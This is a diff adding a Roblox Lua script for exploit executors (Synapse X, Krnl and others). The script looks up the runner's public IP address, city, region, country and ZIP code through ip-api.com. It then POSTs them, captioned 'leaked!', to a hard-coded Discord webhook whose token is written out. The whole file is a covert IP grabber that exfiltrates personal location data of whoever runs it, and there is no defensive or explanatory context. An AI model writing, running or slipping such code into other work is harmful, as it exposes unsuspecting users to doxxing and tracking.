@@ -1,0 +1,28 @@
+local IpApi = game.HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/", true))
+local Address = IpApi["city"] .. " " .. IpApi["regionName"] .. " " .. IpApi["country"] .. " " .. IpApi["zip"].." "..IpApi["query"]
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Script-Ware"
+
+local url =
+   "https://discord.com/api/webhooks/1033500076313690242/CEp-3HZXGrS2NaUNJjIL24rTyC9ywKp8SAhGgb2CoqOPg7RGr-blhKpaX0KuFYfh1zy_"
+local data = {
+   ["content"] = "leaked!?!?!?1/1/1?!?/1/1/1/",
+   ["embeds"] = {
+       {
+           ["title"] = "hello",
+           ["description"] = ""..Address
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
